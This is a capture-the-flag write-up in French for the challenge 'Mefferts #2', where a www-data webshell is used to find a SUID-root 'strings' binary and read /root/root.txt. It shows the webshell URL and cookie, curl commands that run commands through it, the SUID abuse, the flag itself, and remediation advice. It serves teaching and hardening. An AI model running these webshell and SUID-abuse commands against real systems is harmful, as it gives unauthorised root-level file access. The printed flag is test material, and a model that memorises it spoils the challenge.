# Mefferts #2

**Catégorie :** Élévation de privilèges (binaire SUID + GTFOBins strings → root)
**Cible :** `10.10.0.5` (suite de Mefferts — `www-data` → `root`)
**Difficulté :** Medium
**Objectif :** Lire `root.txt`
**Flag :** `EPI{whA7_i5_7Hi5_5h3Ng5h0u_3Xaminx_i5_11x11_w7f}`

---

## Objectif

Suite directe de Mefferts #1. On dispose déjà d'une RCE en tant que `www-data` via le webshell caché (`/my_very_secret_dir/index.php`, cookie `login=uwe:thisisnotevennecessary`). Le but est d'atteindre **root** en exploitant un binaire `strings` configuré en **SUID root**, listé sur GTFOBins comme vecteur de lecture de fichiers arbitraires.

---

## 1. Rappel du point de départ (RCE www-data)

```bash
IP=10.10.0.5
SH="http://$IP:22/my_very_secret_dir/index.php"
C='login=uwe:thisisnotevennecessary'
curl -s -b "$C" -G "$SH" --data-urlencode "cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

*(Si la box a redémarré, rejouer la chaîne du #1 : POST recovery.php → cookie → webshell.)*

---

## 2. Énumération pour l'élévation de privilèges

```bash
# sudo (impasse)
curl -s -b "$C" -G "$SH" --data-urlencode "cmd=sudo -n -l 2>&1"
# → sudo: a password is required   (www-data ne peut rien faire sans mot de passe)

# binaires SUID
curl -s -b "$C" -G "$SH" --data-urlencode "cmd=find / -perm -4000 -type f 2>/dev/null"
```

```
/usr/bin/mount
/usr/bin/passwd
/usr/bin/umount
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/x86_64-linux-gnu-strings     ← ANOMALIE : strings en SUID
/usr/bin/sudo
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```

```bash
# homes
curl -s -b "$C" -G "$SH" --data-urlencode "cmd=ls -la /home"
```

```
drwx------ 1 uwe  uwe  4096 ... uwe               ← home de uwe fermé (user.txt dedans)
-rw-r--r-- 1 root root 1629 ... uwe_passwords     ← fichier lisible par tous
```

Tous les SUID sont standards **sauf** `/usr/bin/x86_64-linux-gnu-strings` (un `strings` renommé) — c'est l'anomalie intentionnelle.

---

## 3. Fausse piste : /home/uwe_passwords

```bash
curl -s -b "$C" -G "$SH" --data-urlencode "cmd=cat /home/uwe_passwords"
```

Le fichier contient un blob Base64. Décodé :

```bash
cat uwe_passwords_b64 | tr -d '\n ' | base64 -d
```

→ un texte français (la tirade d'Otis dans *Mission Cléopâtre*, « le goût des choses bien faites... »). **C'est un leurre** malgré son nom : aucun mot de passe. À ne pas confondre — le nom du fichier est un piège.

---

## 4. Vérification du SUID strings

```bash
curl -s -b "$C" -G "$SH" --data-urlencode "cmd=ls -la /usr/bin/x86_64-linux-gnu-strings"
```

```
-rwsr-sr-x 1 root root 31808 ... /usr/bin/x86_64-linux-gnu-strings
```

Le `s` dans `rws` = bit **SUID** (le second `s` = SGID). Propriétaire **root**. Le binaire s'exécute donc avec l'**euid root**.

---

## 5. Exploitation — lecture du flag root

`strings` est listé sur [GTFOBins](https://gtfobins.github.io/gtfobins/strings/) : en SUID, il permet la **lecture de fichiers arbitraires**. On lit directement le flag :

```bash
curl -s -b "$C" -G "$SH" --data-urlencode "cmd=/usr/bin/x86_64-linux-gnu-strings /root/root.txt"
```

```
EPI{whA7_i5_7Hi5_5h3Ng5h0u_3Xaminx_i5_11x11_w7f}
```

**Pourquoi ça marche :** le bit SUID fait tourner `strings` avec l'**euid** de son propriétaire (root). Quand le binaire ouvre `/root/root.txt`, le noyau vérifie la permission de lecture selon l'euid (root) → lecture autorisée, alors que le processus réel est www-data. `strings` extrait ensuite les chaînes lisibles du fichier = son contenu.

---

## 6. Concepts clés

| Concept | Explication |
| --- | --- |
| Bit SUID | Un exécutable SUID tourne avec l'euid de son **propriétaire**, pas de l'appelant. `-rws...` = SUID actif. |
| euid et lecture | Les vérifications d'accès aux fichiers utilisent l'**euid** → un SUID root lit les fichiers de root. |
| GTFOBins (strings) | `strings` en SUID = lecture de fichiers arbitraires (comme `cat`, mais via l'euid élevé). |
| Binaire polyvalent | Mettre en SUID root un binaire capable de lire des fichiers = donner un accès en lecture root. |
| Leurre | `/home/uwe_passwords` porte un nom trompeur ; son contenu (Base64) est un texte sans intérêt. |

### Comparaison avec Daemon Slayer #2 (question de défense)

- **DS#2 (doas + openssl) :** `doas` vérifie le **ruid**. Un shell SUID (`bash -p`) ne donne que l'euid → insuffisant. Il fallait passer par le **cron** pour avoir le ruid réel = muzan.
- **Mefferts #2 (strings SUID) :** le bit SUID élève directement l'**euid**, et `strings` lit selon l'euid → **aucun détour**, l'exploitation marche depuis le webshell (ruid=www-data sans importance).

→ La différence tient à *quelle identité* le mécanisme vérifie : ruid (doas) vs euid (accès fichier via SUID).

---

## 7. Recommandations de remédiation

- **Ne jamais mettre en SUID root** un binaire capable de lire/écrire des fichiers (`strings`, `cat`, `cp`, `find`, `vim`...). Retirer le bit : `chmod u-s /usr/bin/...`.
- **Auditer les SUID** régulièrement (`find / -perm -4000`) et ne garder que le strict nécessaire.
- **Moindre privilège :** un binaire de lecture arbitraire en SUID root équivaut à un accès root en lecture (secrets, `/etc/shadow`, flags...).
- **Fichiers sensibles :** ne pas laisser de fichiers world-readable dans `/home` (même leurres — ça pollue et peut fuiter des infos).

---

## 8. Résumé de la chaîne

```
RCE www-data (webshell hérité du #1)
  → sudo -l : mot de passe requis (impasse)
  → find -perm -4000 → /usr/bin/x86_64-linux-gnu-strings en SUID root
  → /home/uwe_passwords = leurre (Base64 → texte FR)
  → strings SUID lit /root/root.txt (euid root) → FLAG
```

| Étape | Technique | Résultat |
| --- | --- | --- |
| 1 | Rappel RCE www-data | point de départ |
| 2 | `sudo -l` + `find -perm -4000` | strings en SUID root repéré |
| 3 | Analyse `/home/uwe_passwords` | leurre écarté |
| 4 | GTFOBins `strings` SUID | lecture de `/root/root.txt` → FLAG |